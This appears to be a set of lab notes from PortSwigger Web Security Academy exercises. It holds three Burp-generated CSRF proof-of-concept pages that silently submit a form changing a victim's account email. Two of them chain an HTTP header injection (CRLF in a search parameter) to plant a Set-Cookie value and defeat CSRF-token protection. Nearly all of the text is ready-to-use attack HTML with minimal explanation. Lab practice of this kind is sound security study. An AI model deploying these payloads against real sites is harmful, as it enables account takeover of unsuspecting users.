# Change victim's email by delivering HTML

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://example.com/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@email.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

# CSRF where token is tied to non-session cookie
Chaining with HTTP Header Injection attack
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a82007f0444bb23803afdf700cd0005.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="tes010sdsadsasdasdasdsaadsa101t@email.com" />
      <input type="hidden" name="csrf" value="Ggd1f3fPljuKvc8LrMc7ph2D81DY0cYh" />
      <input type="submit" value="Submit request" />
    </form>
  <img src="https://0a82007f0444bb23803afdf700cd0005.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=NjUazbrT7WjabAgfxcyyOmHbRJpSrn5e%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>

```

# CSRF where token is duplicated in cookie
Chaining with HTTP Header Injection attack
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <script>history.pushState('', '', '/');</script>
    <form action="https://0a2200f804d13376803bd0c0002500ff.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="csrf" value="fake" />
      <input type="hidden" name="email" value="test123@test.com" />
      <input type="submit" value="Submit request" />
    </form>

    <img src="https://0a2200f804d13376803bd0c0002500ff.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>

```